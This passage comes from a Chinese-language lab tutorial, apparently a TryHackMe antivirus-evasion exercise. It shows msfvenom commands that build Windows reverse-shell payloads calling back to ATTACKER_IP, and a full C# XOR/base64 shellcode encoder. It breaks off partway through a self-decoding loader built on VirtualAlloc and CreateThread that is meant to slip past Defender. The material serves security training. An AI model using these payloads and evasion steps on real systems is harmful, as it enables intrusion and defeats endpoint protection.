style="color:#393A34">&lt;</span><span class="token plain">value</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">==</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    aes256</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rc4</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    xor</span><br></span></code></pre></div></div>
<p>让我们构建一个 XOR 加密的 payload。 对于这种类型的算法，您需要指定一个密钥。 命令将如下所示：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Xoring Shellcode using the Metasploit Framework</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/meterpreter/reverse_tcp </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7788</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> exe </span><span class="token parameter variable" style="color:#36acaa">--encrypt</span><span class="token plain"> xor --encrypt-key </span><span class="token string" style="color:#e3116c">&quot;MyZekr3tKey***&quot;</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> xored-revshell.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> No arch selected, selecting arch: x64 from the payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">No encoder specified, outputting raw payload</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Payload size: </span><span class="token number" style="color:#36acaa">510</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Final size of exe file: </span><span class="token number" style="color:#36acaa">7168</span><span class="token plain"> bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Saved as: xored-revshell.exe</span><br></span></code></pre></div></div>
<p>再次强调，如果我们将生成的 shell 上传到 THM 防病毒检查！ 页面位于 <code>http://MACHINE_IP/</code>，它仍然会被防病毒软件标记。 原因仍然是防病毒供应商投入了大量时间来确保检测到简单的 msfvenom payload。</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="创建自定义-payload">创建自定义 payload<a href="#创建自定义-payload" class="hash-link" aria-label="创建自定义 payload的直接链接" title="创建自定义 payload的直接链接" translate="no">​</a></h3>
<p>克服这个问题的最佳方法是使用我们自己的自定义编码方案，这样防病毒软件就不知道如何分析我们的 payload。 请注意，您不必做任何太复杂的事情，只要它足够让防病毒软件分析时感到困惑即可。 对于此任务，我们将采用 msfvenom 生成的简单反向 shell，并使用 XOR 和 Base64 的组合来绕过 Defender。</p>
<p>让我们首先以 CSharp 格式使用 msfvenom 生成一个反向 shell：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Generate a CSharp shellcode Format</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ msfvenom </span><span class="token assign-left variable" style="color:#36acaa">LHOST</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">ATTACKER_IP </span><span class="token assign-left variable" style="color:#36acaa">LPORT</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">443</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-p</span><span class="token plain"> windows/x64/shell_reverse_tcp </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> csharp</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="编码器">编码器<a href="#编码器" class="hash-link" aria-label="编码器的直接链接" title="编码器的直接链接" translate="no">​</a></h3>
<p>在构建实际有效载荷之前，我们将创建一个程序，该程序将获取msfvenom生成的shellcode，并以我们喜欢的任何方式对其进行编码。 在这种情况下，我们将首先使用自定义密钥对有效载荷进行XOR运算，然后使用base64对其进行编码。 以下是编码器的完整代码（您也可以在Windows机器的<code>C:\Tools\CS Files\Encryptor.cs</code>中找到此代码）：</p>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 完整有效载荷代码（点击阅读） </summary><div><div class="collapsibleContent_i85q"><div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Collections</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Generic</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Linq</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Text</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Threading</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Tasks</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">namespace</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">Encrypter</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">internal</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Program</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">byte</span><span class="token return-type class-name punctuation" style="color:#393A34">[</span><span class="token return-type class-name punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                shell</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^=</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> args</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">//XOR Key - It has to be the same in the Droppr for Decrypting</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token plain"> key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;THMK3y123!&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">//Convert Key into bytes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> keyBytes </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Encoding</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ASCII</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">GetBytes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">//Original Shellcode here (csharp format)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> buf </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token constructor-invocation class-name keyword" style="color:#00009f">byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">460</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xfc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token range operator" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xda</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xd5</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token comment" style="color:#999988;font-style:italic">//XORing byte by byte and saving into a new array of bytes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> encoded </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> keyBytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Console</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">WriteLine</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Convert</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">ToBase64String</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">encoded</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div></div></div></details>
<p>代码非常简单明了，将生成一个编码的有效载荷，我们将将其嵌入到最终有效载荷中。 请记住将buf变量替换为您使用msfvenom生成的shellcode。</p>
<p>要编译和执行编码器，我们可以在Windows机器上使用以下命令：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Compiling and running our custom CSharp encoder</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> csc.exe Encrypter.cs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> .</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Encrypter.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">pEvWzJg3oE</span><span class="token operator" style="color:#393A34">=</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="自解码有效载荷">自解码有效载荷<a href="#自解码有效载荷" class="hash-link" aria-label="自解码有效载荷的直接链接" title="自解码有效载荷的直接链接" translate="no">​</a></h3>
<p>由于我们有一个编码的有效载荷，我们需要调整我们的代码，以便在执行之前解码shellcode。 为了匹配编码器，我们将以与编码相反的顺序解码所有内容，因此我们首先解码base64内容，然后使用与编码器中相同的密钥对结果进行XOR运算。 以下是完整有效载荷代码（您也可以在Windows机器的<code>C:\Tools\CS Files\EncStageless.cs</code>中获取）：</p>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 完整有效载荷代码（点击阅读） </summary><div><div class="collapsibleContent_i85q"><div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Net</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Text</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Runtime</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">InteropServices</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Program</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flAllocationType</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">IntPtr</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadAttributes</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwStackSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">IntPtr</span><span class="token plain"> param</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwCreationFlags</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">IntPtr</span><span class="token plain"> hHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwMilliseconds</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> MEM_COMMIT </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1000</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> PAGE_EXECUTE_READWRITE </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">byte</span><span class="token return-type class-name punctuation" style="color:#393A34">[</span><span class="token return-type class-name punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name keyword" style="color:#00009f">int</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> shell</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                shell</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">^=</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">i </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> KeyBytes</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">]</span><span 